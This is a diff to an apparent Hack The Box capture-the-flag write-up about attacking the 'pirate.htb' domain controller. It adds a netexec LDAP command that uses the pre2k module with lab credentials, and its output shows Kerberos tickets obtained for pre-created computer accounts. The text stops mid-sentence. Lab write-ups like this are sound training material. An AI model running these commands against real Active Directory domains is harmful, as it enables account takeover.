@@ -186,5 +186,21 @@ SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.244.95   445    DC01             [-] pirate.htb\exch01$:exch01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 ```
 
-Both credentials are valid however 
+Both credentials are valid however i am not authorized to use these credentials to logon
+
+```python
+faketime -f +7h nxc ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
+LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
+PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
+PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
+```
+
+however 
+
+
 
